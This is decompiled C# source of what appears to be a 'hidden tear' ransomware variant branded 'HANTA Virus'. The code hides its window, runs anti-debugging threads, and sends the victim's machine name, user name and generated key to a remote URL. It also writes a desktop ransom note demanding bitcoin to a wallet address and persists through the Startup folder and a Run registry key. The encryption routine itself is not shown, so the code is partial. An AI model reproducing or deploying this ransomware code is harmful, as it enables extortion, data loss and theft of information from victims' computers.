using System;
using System.ComponentModel;
using System.Drawing;
using System.IO;
using System.Net;
using System.Reflection;
using System.Text;
using System.Threading;
using System.Windows.Forms;
using Microsoft.Win32;

namespace hidden_tear;

public class Form1 : Form
{
	private string targetURL = "https://www.example.com/hidden-tear/write.php?info=";

	private string userName = Environment.UserName;

	private string computerName = Environment.MachineName.ToString();

	private string site = "GRUBBO:pVVMPIt0SmoaDzuN/xoxQoV6QJna4k67g3fCuGYdZ/3xxasFWOabOTs8dpkzTpsHGmhnS8mEVU1Hj0uuthXs3A==";

	private IContainer components = null;

	protected override CreateParams CreateParams
	{
		get
		{
			CreateParams createParams = ((Form)this).get_CreateParams();
			createParams.set_ExStyle(createParams.get_ExStyle() | 0x80);
			return createParams;
		}
	}

	public Form1()
	{
		InitializeComponent();
	}

	private void Form1_Load(object sender, EventArgs e)
	{
		Thread thread = new Thread(help.DateCheck);
		Thread thread2 = new Thread(help.anti_debug);
		thread.Start();
		thread2.Start();
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowInTaskbar(false);
		startAction();
	}

	private void Form_Shown(object sender, EventArgs e)
	{
		((Control)this).set_Visible(false);
		((Form)this).set_Opacity(100.0);
	}

	public string CreatePassword(int length)
	{
		StringBuilder stringBuilder = new StringBuilder();
		Random random = new Random();
		while (0 < length--)
		{
			stringBuilder.Append("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/"[random.Next("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ1234567890*!=&?&/".Length)]);
		}
		return stringBuilder.ToString();
	}

	public void SendPassword(string password)
	{
		string text = computerName + "-" + userName + " " + password;
		string address = targetURL + text;
		new WebClient().DownloadString(address);
	}

	public void startAction()
	{
		CreatePassword(30);
		help.set_wallpaper();
		messageCreator();
		Application.Exit();
	}

	public void messageCreator()
	{
		string folderPath = Environment.GetFolderPath(Environment.SpecialFolder.Desktop);
		string path = folderPath + "\\how_to_recover.txt";
		string[] contents = new string[9] { "- WHAT HAPPENED TO MY COMPUTER?", "", "All Files on your system has been encrypted with HANTA Virus.", "Nobody will be able to decrypt ANY of your files without our decryption service. Dont waste your time.", "", "- CAN I RECOVER MY FILES?", "", "You will be able to recover your files only after you send 50$ to this BTC wallet: ", "1HYpnNyAERfmC5bnueGs7E3qDgMAxRiLGC" };
		File.WriteAllLines(path, contents);
	}

	private string ToString(byte[] bytes)
	{
		string text = string.Empty;
		foreach (byte b in bytes)
		{
			string text2 = text;
			char c = (char)b;
			text = text2 + c;
		}
		return text;
	}

	private static void addToStartupRegistry(string name, string path)
	{
		string location = Assembly.GetEntryAssembly()!.Location;
		byte[] buffer = File.ReadAllBytes(location);
		dropFile(Environment.GetFolderPath(Environment.SpecialFolder.Startup) + "\\HANTA.exe", buffer);
		try
		{
			RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run", writable: true);
			registryKey.SetValue(name, "\"" + path + "\"");
		}
		catch
		{
		}
	}

	private static void dropFile(string path, byte[] buffer)
	{
		try
		{
			if (!File.Exists(path))
			{
				File.WriteAllBytes(path, buffer);
			}
		}
		catch
		{
		}
	}

	protected override void Dispose(bool disposing)
	{
		if (disposing && components != null)
		{
			components.Dispose();
		}
		((Form)this).Dispose(disposing);
	}

	private void InitializeComponent()
	{
		//IL_004d: Unknown result type (might be due to invalid IL or missing references)
		//IL_0057: Expected O, but got Unknown
		ComponentResourceManager componentResourceManager = new ComponentResourceManager(typeof(Form1));
		((Control)this).SuspendLayout();
		((ContainerControl)this).set_AutoScaleDimensions(new SizeF(6f, 13f));
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		((Form)this).set_ClientSize(new Size(124, 53));
		((Form)this).set_Icon((Icon)componentResourceManager.GetObject("$this.Icon"));
		((Control)this).set_Name("Form1");
		((Control)this).set_Text("hidden tear");
		((Form)this).add_Load((EventHandler)Form1_Load);
		((Control)this).ResumeLayout(false);
	}
}
